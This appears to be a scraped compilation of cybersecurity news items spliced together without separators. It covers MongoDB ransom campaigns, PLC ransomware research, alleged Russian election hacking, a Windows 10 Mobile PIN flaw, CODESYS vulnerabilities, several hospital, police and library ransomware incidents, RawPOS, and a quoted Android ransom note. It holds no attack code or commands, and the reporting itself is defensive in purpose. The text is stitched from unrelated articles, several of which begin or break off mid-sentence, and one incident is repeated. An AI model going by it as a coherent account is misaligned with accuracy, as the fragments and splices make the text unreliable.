The Readme collection will contain a ransom note that explains that the database has been encrypted and that the victims need to pay them a ransom to get it back. In the Mongo Lock campaign, as shown below, the attackers do not leave a bitcoin address, but rather direct the victim's to contact them via email.
While the ransom note claims that the attackers are exporting the database first before deleting it, it is not known if they are doing that in ever case.
Victims are paying ransoms
When looking up some of the bitcoin addresses used in recent MongoDB attacks, victims have been paying the ransoms. 
For example, the bitcoin address 3FAVraz3ovC1pz4frGRH6XXCuqPSWeh3UH, which has been used often, has had 3 ransom payments for a total of 1.8 bitcoins. This is equivalent to a little over $11,000 USD at the current value of bitcoins.

The hackers could then lock these computers  up and demand a ransom or else cause a blackout or poison the city's water.
While that's a scary scenario, it fortunately  hasn't happened—yet.
But a group of researchers from the Georgia Institute of Technology warn that could change very soon, and to prove it they have developed and tested in their lab a working proof of concept ransomware that specifically targets three types of PLCs.
In their scenario, a group of cybercriminals targets PLCs that are exposed online and infects them with custom malware designed to reprogram the tiny computer with a new password, locking out the legitimate owners.
The hackers then alert the owner, asking for a ransom.
""Ransomware"" is a specific type of malicious software that infects computers and locks or encrypts their content, demanding a ransom to return the machines  to their original state.
It's been extremely popular in the last couple of years, and is often successful because it's usually easier for victims to pay the ransom than try to decrypt the files on their own.
Initially, ransomware targeted regular internet users indiscriminately, but there have already been cases of attacks against hospitals, hotels and other businesses.
(And there will soon be attacks on Internet of Things too)
 Thus, the researchers argue, it's inevitable that criminals will soon target critical infrastructure directly.
Beyah and his colleagues David Formby and Srikar Durbha searched the internet for the two models of PLCs that they attacked in the lab and found more 1,500 that were exposed online.
With their research, Beyah said, the three hope that industrial control systems administrators will start adopting common security practices such as changing the PLCs default passwords, putting them behind a firewall, and scanning the networks for potential intruders.
If they don't, they might find their systems locked, and the consequence could spill into the physical world.

A view of the Kremlin in Moscow on Jan. 6, 2017.
Russia's alleged use of computer hacking to interfere with the U.S. presidential election fits a pattern of similar incidents across Europe for at least a decade.
Cyberattacks in Ukraine, Bulgaria, Estonia, Germany, France and Austria that investigators attributed to suspected Russian hackers appeared aimed at influencing election results, sowing discord and undermining faith in public institutions that included government agencies, the media and elected officials.
Those investigations bolster U.S. intelligence findings of Russian meddling to help elect Donald Trump, a conclusion the president-elect has disputed — although he conceded Friday after a private intelligence briefing that Russia was among the possible hacking culprits.
“They’ve been very good at using the West’s weaknesses against itself, the open Internet to hack, the free media to sow discord, and to cause people to question the underpinnings of the systems under which they live,” said Hannah Thoburn, a research fellow at the Hudson Institute, a Washington think tank.
U.S. National Intelligence Director James Clapper told a Senate committee Thursday that Russian intelligence hackers, masquerading as third parties, have conducted attacks abroad that targeted critical infrastructure networks.
“Russia also has used cyber tactics and techniques to seek to influence public opinion across Europe and Eurasia,” Clapper said.
A declassified intelligence report on the Russian hacking released Friday accused Russian President Vladimir Putin of ordering the effort to help elect Trump.
It warned that Russia would use lessons learned from the effort to disrupt elections of U.S. allies.

Intel chiefs: We're certain that Russia tried to influence U.S. election
In 2007, Putin told the Munich Security Conference that the United States’ effort to spread its form of democracy was an insidious threat to Russia and other nations and that his government would push back.
Russian sabotage of Western computer systems started that same year.
In 2007, Estonia accused hackers using Russian IP addresses of a wide-scale denial of service attack that shut down the Internet in the former Soviet republic and one of NATO’s newest members.
According to The Guardian newspaper, the attacks came in waves that coincided with riots on May 3, 2007, over the statue, whose removal drew objections from Russia and Russian-speaking Estonians, and on May 8 and 9, when Russia celebrated its victory over Nazi Germany.
They blamed the attacks on a pro-Russia group called CyberBerkut.
Hudson analyst Thoburn, who was working as an election observer in Ukraine at the time, said the Ukrainians were able to get around it by deleting their entire system and restoring it from a backup that was not contaminated.
Ukrainian officials have also accused Russia of being behind a power grid attack in December 2015 that cut power to 80,000 in western Ukraine.
In overt actions against Ukraine, Russia seized the province of Crimea in 2014 and helped armed separatists launch a rebellion in eastern Ukraine.
German intelligence in 2015 accused Russia of hacking at least 15 computers belonging to members of Germany’s lower house of parliament, the Bundestag, and stealing data.
Germany’s Federal Office for the Protection of the Constitution (BfV) said the attack was conducted by a group called Sofacy, which “is being steered by the Russian state.""
BfV chief Hans-Georg Maassen told Reuters in November that Moscow has tried to manipulate the media and public opinion through various means, including planting false stories.
One in 2015 by Russian media was about a German-Russian girl kidnapped and raped by migrants in Berlin.
German Chancellor Angela Merkel said she could not rule out Russian interference in Germany's 2017 federal election through Internet attacks and disinformation campaigns.
The country's Central Election Commission had been hacked during a referendum and local elections in 2015 that was almost certainly linked to Russia and a group that had hacked NATO headquarters in Brussels in 2013, then-President Rosen Plevneliev told the BBC in November.
""The same organization that has attacked the (German Parliament) — stealing all the emails of German members of Parliament — the same institution that has attacked NATO headquarters, and that is the same even that has tried to influence American elections lately and so in a very high probability you could point east from us” (to Moscow), Plevneliev said.
A pro-Russian political novice was elected in November to replace Plevneliev.
The Vienna-based Organization for Security and Cooperation in Europe, whose tasks include monitoring elections across Europe and the conflict in eastern Ukraine, was attacked in “a major information security incident” in November, spokeswoman Mersiha Causevic Podzic said.
The incident “compromised the confidentiality” of the organization’s IT networks, Podzic said.
The French daily Le Monde, which first reported the incident, cited a Western intelligence agency attributing the attack to the Russia-linked group APT28, aka Fancy Bear, and Sofacy.
Russia, a member of the OSCE, has objected to the group’s criticism of Russian-backed forces battling the Ukrainian government in eastern Ukraine.
Russian hackers posing as the “Cyber Caliphate” were suspected of attacking France’s TV5Monde television channel in 2014, causing extensive damage to the company’s computer systems, FireEye, a cyber security firm that examined the attack, told BuzzFeed.
The attack involved posting of Islamic State propaganda, but appeared to use the same servers and have other similarities with Russian-linked APT28, the group that is a suspect in attacks on the Democratic National Committee, the OSCE and several other European countries.
“APT28 focuses on collecting intelligence that would be most useful to a government,” FireEye said.
“Specifically, since at least 2007, APT28 has been targeting privileged information related to governments, militaries and security organizations that would likely benefit the Russian government”.
The security chief of France's ruling Socialist Party recently warned that the country's presidential election this spring is at risk of being hacked.
Hackers in 2014 attacked the Warsaw Stock Exchange and at least 36 other Polish sites, stealing data and posting graphic images from the Holocaust.
The group that claimed responsibility, CyberBerkut, is the same Russian-linked group that attacked Ukrainian sites.
The group, posing as Islamic radicals, stole data and released dozens of client log-in data, causing mayhem for the exchange, according to Bloomberg News.
Dan Wallach, a computer scientist at Rice University who testified about election computer security on Capitol Hill in September, said definitive proof of who conducted an attack would reveal methods and sources who would be lost or killed if exposed.
“You’re never going to have definitive attribution,” Wallach said in an interview.
“The proof is some crazy top secret thing and not for public dissemination”.

This Monday, Bleeping Computer broke the news that a hacker/group identified as Harak1r1 was taking over MongoDB databases left connected to the Internet without a password on the admin account.
The group was exporting the database's content and replacing all tables with one named WARNING, that contained a ransom note, asking the owners of the hacked database to pay 0.2 Bitcoin (~$200) into Bitcoin wallet.
At the time of our article, Harak1r1 had hijacked just over 1,800 MongoDB databases, and 11 victims have paid the ransom in order to recover their files.
As time went by, Harak1r1 hijacked more databases, reaching at one point over 3,500 MongoDB instances, and currently peaking at over 8,500.
Among them, the hacker(s) had even managed to make a high-profile victim, in Emory Healthcare, a US-based healthcare organization.
According to the MacKeeper Security Research Team, Harak1r1 had ransacked and blocked Emory's access to more than 200,000 medical records.
Attacks from harak1r1 went on for two more days, but as worldwide infosec media started covering the topic, two copycats appeared and started doing the same.
The second group goes by the name of 0wn3d, and they work by replacing the hijacked database tables with a table named WARNING_ALERT.
According to Victor Gevers, the researcher who initially discovered the first hacked MongoDBs around Christmas, this second group has hijacked just over 930 databases.
Unlike Harak1r1, this second group is a little bit more greedy and asks for 0.5 Bitcoin, which is around $500, but this hasn't stopped companies from paying, with 0wn3d's Bitcoin wallet showing that at least three victims had paid his ransom demands.
A day later, the same Gevers came across a third actor, using the name 0704341626asdf, which appears to have hit over 740 MongoDB servers.
This hacker/group is asking for 0.15 Bitcoin (~$150), and he's using a lengthier ransom note, in which he admonishes victims for leaving their DB open over the Internet.
Furthermore, this threat actor appears to be more strict with victims and gives database owners 72 hours to pay the ransom.
According to Gerves, the lines that allowed him to track the activity of these three groups is slowly blurring, as these groups started using more varied messages and different Bitcoin addresses.
Additionally, in newer variations of these attacks, the hackers don't appear to bother copying the hacked database.
In recent attacks, Gevers says that crooks just delete the DB's content, ask for a ransom regardless, and hope nobody checks the logs and discovers what they've done.
There is no evidence that they actual copied your database.
According to Gevers, these groups are now fighting over the same turf, with many of them rewriting each other's ransom notes.
This leads to cases where database owners pay the ransom to the wrong group, who can't give their content back.
""It's catching on and it looks more players are coming to the game.

Today, we noticed a pretty weird security flaw in Windows 10 Mobile.
If you are using a Windows 10 Mobile that does not support Windows Hello, your are likely using a pin to secure your device.
The pin can be easily set-up from Windows 10 Mobile’s Sign-in Options page in the Settings app.
However, there’s an interesting issue with this system.
That’s because you can easily remove the pin from the device without having to verify the current pin that’s set.
For instance, if your pin is “2017” and someone else gets access to your phone, they can simply remove it without having to verify the pin.
This, however, isn’t the case when you try to change the pin as the OS will ask you to verify the existing pin first.
This may sound like a minor issue, but it actually isn’t one — that’s because someone can easily lock you out of your own device once they get the initial access (which, to be fair, can be difficult to attain).
For example, they can remove the current pin, and set a new one without having to verify the password for the linked Microsoft Account on the device or the pin (since it’s already removed).
This isn’t how the pin-lock system works on Android or iOS.
Both of these operating systems require users to verify their pin/password/pattern before they can edit any of the settings related to the pin — including the ability to completely remove the pin from the device.
What’s even more interesting is that this issue doesn’t exist on Windows 10 PCs where you will be required to verify the existing pin when you try to remove the pin from a device.
As far as we are aware, the issue is impacting Windows 10 Mobile devices running Windows 10 Mobile Version 1511, 1607, and even the latest Insider preview releases.
We hope Microsoft will fix this issue in Windows 10 Mobile pretty soon, and we’ll let you know if and when that happens.

 Thousands of industrial control systems (ICS) could be at risk of hacking due to critical vulnerabilities affecting a popular piece of software. SecurityWeek detailed how the flaws affect an application from 3S-Smart Software Solutions. The potential problem for ICS security stems from CODESYS, a hardware-independent middleware layer for programming Industrial Internet of Things (IIoT) and ICS.
 SecurityWeek reported the issue has now been resolved by 3S-Smart Software Solutions. However, the need for a patch, which could take some time to roll out to all affected organizations, highlighted the need for IT managers to be aware of the risk to connected technologies, particularly when it comes to ICS security.
 The flaws were discovered by security firm CyberX. Phil Neray, vice president of industrial cybersecurity and marketing at CyberX, described how the vulnerabilities affect all devices incorporating CODESYS Web Server v2.3 and earlier versions of the software.
 CODESYS is used to program a range of devices, such as programmable logic controllers and human machine interfaces. CyberX detailed how these devices are used in almost all elements of critical industrial infrastructure, including power plants, oil and gas installations, and chemical and pharmaceutical factories.
 The first vulnerability, CVE-2017-6027, allows an attacker to upload arbitrary files to the CODESYS Web Server and potentially create remote code execution. The second flaw, CVE-2017-6025, is a stack-based buffer overflow that attackers could use to crash the application or execute arbitrary code.
 The fear is that attackers could use the flaws to create safety failure and environmental damage at critical industrial infrastructure. ICS-CERT published an advisory note and rated the potential risk score of the vulnerabilities as critical because attackers can potentially gain remote code execution capabilities.
 3S-Smart Software has released a patch, but CyberX suggested that the rollout process could be complicated by a range of factors.

Cybersecurity experts and companies on Long Island are looking for ways to shore up the weakest link on company computer networks: the employee.
Local cybersecurity professionals are creating interactive comic books, testing employees with simulated phishing emails — tailored messages that seek to obtain key information, such as passwords — and seeking to convince top executives that the threat of business disruption from hacking requires their attention.
“The biggest problem is not the technology; it’s the people,” said Laurin Buchanan, principal investigator at Secure Decisions, a division of Northport software developer Applied Visions Inc. 
Sixty percent of cyber-assaults on businesses can be traced to insiders’ actions, either inadvertent or malicious, according to a 2016 study by IBM Security.
The average cost of a data breach for U.S. companies is $7.4 million, or $225 per lost or stolen record, a June 2017 study by IBM and the Ponemon Institute, a Traverse City, Michigan, researcher, found.
Costs related to data breaches can include the investigation, legal costs to defend against and settle class-action lawsuits, credit monitoring for affected customers, and coverage of fraud losses. Harder to gauge is the cost to a company’s reputation.
One of the largest hacks ever was disclosed this month, when credit reporting company Equifax Inc. revealed that sensitive data from 143 million consumers, including Social Security numbers and birth dates, was exposed. A stock analyst from Stifel Financial Corp. estimated that the attack will cost Equifax about $300 million in direct expenses. Investors seem to think the incident will have a much greater impact on
At a seminar in Garden City this month, Henry Prince, chief security officer at Shellproof Security in Greenvale, explained how in a ransomware attack — one of many types — cybercriminals can buy specialized tools such as those used to send phishing emails. The easy availability of that software means that hackers require “no programming experience,” Prince said.
Phishing emails can be blocked by company email filters, firewalls and anti-virus software. But if one gets through and an employee clicks on the link in the phishing email, the business’ network is compromised. Hackers can then encrypt files, preventing access to them by the company and crippling the business, Prince said at the seminar.
Hackers then can demand payment, typically in an untraceable cryptocurrency like Bitcoin — a digital asset that uses encryption — before agreeing to decrypt the files.
“Ransomware is a business to these people,” Prince said. “Ninety-nine percent of the time, ransomware requires user interaction to infect.”
Della Ragione echoed that sentiment: “The greatest risk at a company is the employees. Training employees is one of the best steps in shoring up your defenses.”
In response, many local experts and companies focus on teaching employees how to resist hackers’ tricks.
Secure Decisions has developed interactive comics to teach employees ways of detecting “phishing” emails and other hacking attempts. The company has gotten more than $1 million for research related to the interactive comic project, known as Comic-BEE, from the Department of Homeland Security, as well as a grant for $162,262 from the National Science Foundation.
The comics, inspired by children’s “Choose Your Own Adventure” books, feature different plots depending on the reader’s choices.
“If you can give people the opportunity to role-play, some of the exhortations by the experts will make more sense,” Buchanan said.
The comics are being field-tested at several companies and Stony Brook University. They were featured in July at a DHS cybersecurity workshop in Washington, D.C.
Radu Sion, a computer science professor at Stony Brook and director of its National Security Institute, which studies how to secure digital communications, acknowledged that security is far from a priority for most users.
“Ultimately, the average Joe doesn’t care,” he said. “You [should] treat the vast majority of your users as easily hackable.”
Northwell Health, the New Hyde Park-based health care system that is the largest private employer in New York State, is trying to find and get the attention of those inattentive employees.
Kathy Hughes, Northwell vice president and chief information security officer, sends out “phishing simulations” to the workforce. The emails are designed to mimic a real phishing campaign that seeks passwords and personal information. In April, for instance, Northwell sent out phishing emails with a tax theme.
Hughes collects reports on which employees take the bait by user, department and job function.
“We present them with a teachable moment,” she said. “We point out things in the email that they should have looked at more carefully.”
The emails are supplemented with newsletters, screen savers and digital signage reminding users that hackers are lurking. Another tool: Non-Northwell emails have an “external” notation in the subject line, making it harder for outsiders to pretend to be a colleague.
“We let [the employees] know that they are part of the security team,” she said. “Everybody has a responsibility for security.”
One of the most important constituencies for security is top executives.
Drew Walker, a cybersecurity expert at Vector Solutions in Tampa, Florida, said many executives would rather not know about vulnerabilities to their computer systems, because knowledge of a hole makes them legally vulnerable and casts them in a bad light.
“Nine times out of 10, they don’t want to hear it,” he said. “It makes them look bad.”
Richard Frankel, a former FBI special agent who is of counsel at Ruskin Moscou, said that company tests of cybersecurity readiness often snare CEOs who weren’t paying attention to training.
But attorney Della Ragione said high-profile attacks are getting notice from executives.
“Everyone’s consciousness is being raised,” she said.
Data leaks at Long Island companies have caused executives to heighten security.
In 2014, Farmingdale-based supermarket chain Uncle Giuseppe’s Marketplace said that foreign hackers had breached the credit card database of three stores. Joseph Neglia, director of information technology at Uncle Giuseppe’s, said that after the data breach, which affected about 100 customers, the company began scheduling “monthly vulnerability scans” and upgraded its monitoring and security systems.
For businesses, Stony Brook’s Sion said, the cybersecurity threat is real and immediate.
“I need one second with your machine to compromise it forever and ever,” he said. “It’s an uphill battle.”

Personal and financial data of some 270,000 customers of UK payday loan firm Wonga have likely been pilfered in a data breach. 
The data that was accessed by the attackers includes the name, e-mail address, home address, and phone number of around 245,000 customers in the UK and 25,000 customers in Poland, as well as the last four digits of their payment card number and/or their bank account number and sort code.
“We do not believe your Wonga account password was compromised and believe your [loan] account should be secure, however if you are concerned you should change your account password. We also recommend that you look out for any unusual activity across any bank accounts and online portals,” the company advised users. 
“We will be alerting financial institutions about this issue and any individuals impacted as soon as possible, but we recommend that you also contact your bank and ask them to look out for any suspicious activity.”
They’ve also warned users to be on the lookout for scammers looking to leverage the stolen information to gain more information or money directly from the users.
According to the BBC, the company noticed that something was amiss last week, but it took them until Friday to discover that customer data may have been compromised. The company started to inform customers of the breach on Saturday.
“Wonga’s stock with the general public has never been particularly high, but this breach will see it fall even further. It is simply the latest name in a long list of data breach victims that will come to realise that the reputational impact of a breach is more damaging than anything the ICO can do to them, or the cybercriminals themselves for that matter,” commented Marc Agnew, Vice President, ViaSat Europe.
“The stakes are so high that organisations need to treat cyber-attack not only as a threat, but as an inevitability. Organisations must therefore ensure that all customer data is encrypted, not just the passwords and card details, so that any stolen data is essentially worthless. Inadequately protecting customer data can create massive problems for enterprises and consumers alike. Reacting to an attack appropriately is vital; from isolating and identifying the origin, to taking stock of what has been stolen or affected and making sure those who have been put at risk are notified and protected as soon as possible. By the looks of it, Wonga’s customers were alerted in a timely manner and should be well informed enough to take action. This is all Wonga can do at this stage, but it’ll be interesting to see what happens next and how serious an attack this turns out to be.”
“While the organisation has stated that affected customers are unlikely to be at risk of theft, the fact remains that private personal information was compromised – posing a risk to customers,” André Stewart, VP EMEA at Netskope, pointed out.
“Data loss prevention needs to be a key priority for all businesses. The EU General Data Protection Regulation (GDPR) – set to come into effect in just over a year – will hold organisations accountable for their data practices. As a result, companies will be forced to take active measures to mitigate any threats to personal privacy, whether that data is stored on-premises or in the cloud. Any companies falling short of these standards could face hefty fines,” he also noted.

Lost evidence includes all body camera video, some in-car video, some in-house surveillance video, some photographs, and all Microsoft Office documents.
Data from that period backed up on DVDs and CDs remained intact.
While archived data has its importance, more worrying is that the department lost data from ongoing investigations.
In an interview with WFAA, who broke the story, Stephen Barlag, Cockrell Hill's police chief, said that none of the lost data was critical.
The department also notified the Dallas County District Attorney's office of the incident.
The department says the infection was discovered on December 12, last year, and the crooks asked for a $4,000 ransom fee to unlock the files.
After consulting with the FBI's cyber-crime unit, the department decided to wipe their data server and reinstall everything.
Data could not be recovered from backups, as the backup procedure kicked in shortly after the ransomware took root, and backed up copies of the encrypted files.
According to the department's press release, the Cockrell Hill police IT staff said they were infected with the OSIRIS ransomware.
It's quite possible that the department's server was infected with the Locky ransomware, which a few days prior had come out with a new version that appended the "".osiris"" extension at the end of encrypted files.
The press release says the infection took place after an officer opened a spam message from a cloned (spoofed) email address imitating a department issued email address.
The infection did not spread to other computers because the server was taken offline and disconnected from the local network as soon as staff discovered the ransom demand.
The department also said there was no evidence of data exfiltration to a remote server.

Over 200 victims in Europe and beyond continue to suffer from a brand new ransomware attack demanding Bitcoin to release encrypted files.
Known as Bad Rabbit, the ransomware of unknown origin demands 0.05 BTC ($290) to unlock infected computers.
Its progress focuses on Russia and Ukraine, with outbreaks also reported in Turkey and Germany, according to cybersecurity firm Kaspersky Lab.
“While the target is visiting a legitimate website, a malware dropper is being downloaded from the threat actor’s infrastructure,” a report on the ransomware released Tuesday explains.
“No exploits were used, so the victim would have to manually execute the malware dropper, which pretends to be an Adobe Flash installer. We’ve detected a number of compromised websites, all of which were news or media websites.”
As of Thursday, it has become apparent those targets fall outside the news and media sphere, with Odessa Airport and the Kiev Metro’s payment system also seeing breakdowns.
Bad Rabbit is just the latest cyberattack to hit the Russian and Ukrainian zone, with WannaCry and NotPetya all having left their mark over the past six months.
The ransom demands from Bad Rabbit’s hackers are similar to those of WannaCry at around $300 per machine.
Unlike NotPetya, however, there appears to be no attempt to wipe data from victims, whether or not they send the requisite Bitcoins.
Kaspersky adds it is not yet known whether or not paying the ransomware amount results in full control being returned.

GREENFIELD — Hancock Health fell victim to a cyber attack Thursday, with a hacker demanding Bitcoin to relinquish control of part of the hospital’s computer system.
Employees knew something was wrong Thursday night, when the network began running more slowly than normal, senior vice president/chief strategy and innovation officer Rob Matt said.
A short time later, a message flashed on a hospital computer screen, stating parts of the system would be held hostage until a ransom is paid. The hacker asked for Bitcoin — a virtual currency used to make anonymous transactions that is nearly impossible to trace.
The hospital’s IT team opted to immediately shut down the network to isolate the problem. The attack affected Hancock Health’s entire health network, including its physician offices and wellness centers.
Friday afternoon, Hancock Health CEO Steve Long confirmed the network was targeted by a ransomware attack from an unnamed hacker who “attempted to shut down (Hancock Health’s) operations.”
Hospital leaders don’t believe any personal medical information has been compromised, Long said.
Long declined to disclose details of the attack, including how much ransom has been requested. The attack amounts to a “digital padlock,” restricting personnel access to parts of the health network’s computer systems, he said.
The attack was not the result of an employee opening a malware-infected email, a common tactic used to hack computer systems, he said.
The attack was sophisticated, he said, adding FBI officials are familiar with this method of security breach.
“This was not a 15-year-old kid sitting in his mother’s basement,” Long said.
Protecting patients
Notices posted Friday at entrances to Hancock Regional Hospital alerted visitors to a “system-wide outage” and asked any hospital employee or office using a HRH network to ensure all computers were turned off.
Doctors and nurses have reverted to using pen and paper for now to keep patients’ medical charts updated. Long said he wasn’t aware of any appointments or procedures that were canceled directly related to the incident, adding Friday’s snowy weather contributed to many cancellations.
Most patients likely didn’t notice there was a problem, nor did the attack significantly impact patient care, Long said.
Hospital staff members worked with the FBI and a national IT security company overnight and throughout the day Friday to resolve the issue. Long said law enforcement has been acting in an “advisory capacity,” and declined to release details about the plan going forward, including whether the hospital is considering paying the ransom.
Long commended his staff, especially IT workers, who quickly identified the problem Thursday evening.
“If I was going through this with anybody, this is the team I would want to go through this with because I know what the outcome is going to be,” he said.
Leaders updated hospital employees, totaling about 1,200 people, throughout the day Friday and took steps to be accommodate both patients and staff, including offering free food in the hospital cafeteria all day, Long said.
Long said if there is any suggestion private patient information has been compromised, hospital officials will reach out to those affected, though he doesn’t expect that to become an issue.
“We anticipate questions,” he said. “This is not a small deal.”

Anyone who uses the popular Cisco WebEx extension for Chrome should update to the latest version pronto.
Google security researcher Tavis Ormandy recently discovered a serious vulnerability in the Chrome extension that leaves PCs wide open to attack.
The magic string was designed to remotely activate the WebEx browser extension.
Once the extension was activated the bad guys could execute malicious code on the target machine.
The impact on you at home: It’s a good idea for anyone who uses this extension to make sure it’s updated to the latest version given the severity of the vulnerability.
It’s not clear if version 1.0.5 offers any significant protection against the threat Ormandy describes.
Apparently, all version 1.0.3 did was offer a pop-up anytime that magic code was used, according to Cloudfare security researcher Filippo Valsorda.
That puts the onus on the user to make sure they really want to be using WebEx when that pop-up appears.
If you’d rather not bother with the extension it’s also possible to use a temporary, downloadable desktop program each time you want to use WebEx.
That may not be convenient, but it’s an alternative.
Ormandy’s discovery raised enough eyebrows that Mozilla blocked WebEx for Firefox.

It is suspected that Ukrainian-based hackers took the Cockrell Hill Police Department's server for ransom last month, resulting in the loss of video evidence.
The police chief decided not to pay the ransom and instead had the server wiped, according to WFAA in Texas.
The television station reported that the police chief does not believe this was a targeted attack by terrorists.
Cybercriminals are thought to have casted a wide net with spam and an unsuspecting police department employee invited the malware in upon clicking on a link.
According to Acronis, the latest update of the Locky crypto-ransomware variant, Osiris, is behind this attack.

Accoridng to a press release, once the Cockrell Hill Police Department became aware that files on the server had been corrupted by a computer virus, they immediately disconnected the server and all computers from the internet and all state database systems and were able to contain the virus.
The virus had been introduced onto the network from a spam email that had come from a cloned email address imitating a department issued email address.
An internet webpage showed that if the police department paid $4,000 in Bitcoin, then the police department's online contents would be released.
The FBI Cybercrimes unit recommended that the police department isolate and wipe the virus from the servers.
This virus affected all Microsoft Office Suite documents, such as Word documents and Excel files.
In addition, all body camera video, some in-car video, some in-house surveillance video, and some photographs that were stored on the server were corrupted and were lost, the police department stated in its release.
Files that were affected did go back to 2009, however hard copies of all documents and the vast majority of the videos and photographs are still in the possession of the Police Department on CD or DVD.
It is unknown at this time how many total digital copies of documents were lost, as it is also unknown how many videos or photographs that could have assisted newer cases will not be available, although the number of affected prosecutions should remain relatively small, the press release said.

RawPOS continues to evolve, and has recently been equipped with the capability to steal data contained in the victims’ driver’s license’s 2-dimensional barcode.
“Although the use of this barcode is less common than credit card swipes, it is not unheard of. Some people might experience getting their driver’s license barcode scanned in places like pharmacies, retail shops, bars, casinos and others establishments that require it,” Trend Micro researchers explained.
“Traditionally, PoS threats look for credit card mag stripe data and use other components such as keyloggers and backdoors to get other valuable information. RawPOS attempts to gather both in one go, cleverly modifying the regex string to capture the needed data.” 
This particular variant is geared towards collecting data from driver’s licenses issued in the US. 
Thus, along with payment card data, criminals also get information such as the victims’ full name, date of birth, full address, gender, height, hair and eye color. 
This additional info could definitely help criminals impersonate the card holder in many identity theft scenarios, as well as while effecting fraudulent card-not-present transactions.
RawPOS is one of the oldest known Point-of-Sale RAM scraper malware families. It’s first incarnation was spotted all the way back in 2009.
According to the researchers, it is mainly used by threat actors that focus on targeting businesses operating in the hospitality industry.

A controversial Florida-based marketing company has accidentally exposed nearly 400,000 audio recordings with customers, providing criminals with the perfect raw data to commit follow-up fraud.
Security vendor MacKeeper claimed the files were left publicly available, leading to one of its biggest discoveries to date, and include customer details such as names, addresses, phone numbers, credit card numbers and CV2 numbers.
The firm is still working its way through the huge trove of data, but said that it has discovered 17,649 audio recordings with credit card numbers and private customer files and 375,368 audio recordings of “cold calls,” which also include some personal customer information.
The revelations are doubly damaging for the company in question, Vici Marketing.
That’s because back in 2009 it apparently agreed to pay $350,000 to settle a complaint by the Florida Attorney General's Office that got hold of stolen consumer information but didn’t take the correct steps to ensure it was acquired legitimately.
MacKeeper claimed that, as well as the privacy snafu which exposed sensitive customer data, Vici Marketing may also be breaking state laws because many of the cold call recordings do not warn customers that the calls are being recorded and subsequently stored.
“Under the terms of the 2009 settlement Vici is permanently prohibited from acquiring or using data without due diligence, using data of unlawful or questionable origin, accessing and using data for consumer telemarketing without background due diligence, and unlawful telemarketing”.
Researchers said it will take them several weeks to verify all the audio data they have, and promised to securely delete the publicly available data once the case is closed.

A newly discovered threat aims to steal Netflix user credentials and hold them hostage, according to researchers at Trend Micro.
Netflix has 93 million subscribers in more than 190 countries.
It's a popular app, but many people aren't willing to pay the monthly subscription fee.
They'll try to bypass the cost and watch content for free - and cybercriminals are now taking advantage of them.
This newly detected ransomware, RANSOM_NETIX.A, aims to trick Windows PC users with a login generator typically used for software and account membership piracy.
Victims click a ""Generate Login"" button to kick-start the encryption process.
The ransomware uses fake login prompts as a distraction while it encrypts 39 file types under the C:\Users directory.
The program then demands $100 in Bitcoin from victims.
While it targets Windows users, it's worth noting the ransomware destroys itself on systems not running Windows 7 or Windows 10.
Netflix, with its massive user base, presents a tempting opportunity for hackers to exploit vulnerabilities, infect systems to steal user data, and monetize data on the dark Web.
Stolen credentials can be used to bargain among criminals or trick victims into installing malware, which can generate profit.
""We regularly see threat actors utilize popular apps or services as a lure to get victims to infect themselves,"" explains Jon Clay, global director of threat communications at Trend Micro.
""Also, by using imagery that is similar to the real vendor's imagery, [criminals] trick the victim into thinking it's real.""
Clay says this discovery marks a continuation of 2016 ransomware trends, which included the creation of new tactics to generate more victims.
After seeing nearly 750% growth in new ransomware families in 2016, Trend Micro predicted 25% growth in new families for 2017.
The Netflix scam carries implications for how ransomware will evolve later in the year.
""We will likely see other popular vendors targeted with their brands, especially if the actors behind [the Netflix scam] find success,"" he continues.
""They will use this tactic again with other vendors.""
This is a wake-up call for potential victims to protect their accounts.
Best practices include regularly updating account credentials, employing two-factor authentication, limiting downloads to official sources, and being wary of illegitimate emails.
Businesses should educate their employees on how ransomware threats work, and how using legitimate brands in social engineering attacks can trick victims into making dangerous decisions.
Employees should be aware that trying to obtain a free Netflix account is ""bogus,"" says Clay, and should not be acted upon.
If a deal seems too good to be true, it typically is.

Services are being restored to the St. Louis Public Library computer system after a ransomware attack last Thursday impacted access to machines and data at all 17 branches.
Library management refused to pay the $35,000 demanded as ransom, and IT staff wiped affected servers and restored them from available backups.
On Friday, the library was able to restart its circulation workflow, and patrons were able to check out books at all locations.
By Saturday, checkout and returns systems were at 100 percent availability, and now only the library’s reserve system remains to be restored.
That work began on Monday and is expected to be up and running shortly.
Executive director Waller McGuire said the library immediately reached out to the FBI for help with the investigation, and it’s not clear where the infection began, nor how it spread throughout the library network.
“The real victims of this criminal attack are the Library’s patrons.
SLPL has worked hard to open a secure but widely available digital world to the people of St. Louis, and I am sorry it was interrupted,” McGuire said in a letter to library patrons published on Monday.
“An attempt to hold information and access to the world for ransom is deeply frightening and offensive to any public library, and we will make every effort to keep that world available to our patrons”.
McGuire also said that patrons’ personal and financial information is not stored on its servers, and none of that data was impacted by the attack.
Louis Public Library has been working with the FBI to identify how criminals broke into our system and correct the problem,” McGuire said.
“I apologize to patrons for any inconvenience this incident has caused: on most days thousands of St. Louis Public Library patrons check out materials and use computers for many purposes”.
A request for additional comment from McGuire was not returned in time for publication.
It’s unknown which ransomware family was used to attack the library, nor how the infection started.
McGuire said in his letter to patrons that criminals broke into the library network and installed malware.
This runs contrary to most ransomware infections where the malware is spread in spam or phishing emails enticing the victim to open a malicious email attachment or click on a link in the message that downloads the malware.
The St. Louis library is the latest in a growing list of high-profile businesses and public services falling victim to ransomware.
Less than a year has passed since the Hollywood Presbyterian attack, in which a $17,000 ransom was paid, and the Kentucky Methodist Hospital attack, in which officials reportedly refused to pay.
The University of Calgary also fell victim as have other colleges, universities, local law enforcement and government agencies, and entertainment organizations.

Imagine turning on your smartphone to send a text and finding this threatening notice instead:
“You need to pay for us, otherwise we will sell portion of your personal information on black market every 30 minutes.
WE GIVE 100% GUARANTEE THAT ALL FILES WILL RESTORE AFTER WE RECEIVE PAYMENT.
WE WILL UNLOCK THE MOBILE DEVICE AND DELETE ALL YOUR DATA FROM OUR SERVER!
TURNING OFF YOUR PHONE IS MEANINGLESS, ALL YOUR DATA IS ALREADY STORED ON OUR SERVERS!
WE STILL CAN SELLING IT FOR SPAM, FAKE, BANK CRIME etc.
We collect and download all of your personal data.
All information about your social networks, Bank accounts, Credit Cards.
We collect all data about your friends and family.""
This is the message, word for word, found recently by Oren Koriat and Andrey Polkovnichenko, a pair of mobile cybersecurity analysts at Check Point, a security firm in California.
The smartphone on which it appeared was an Android model that had been compromised by smartphone ransomware.
Ransomware has become a ubiquitous threat to personal-computer users.
Criminals remotely access a victim's computer and lock all the files using encryption software, offering to unlock the data in exchange for a payment.
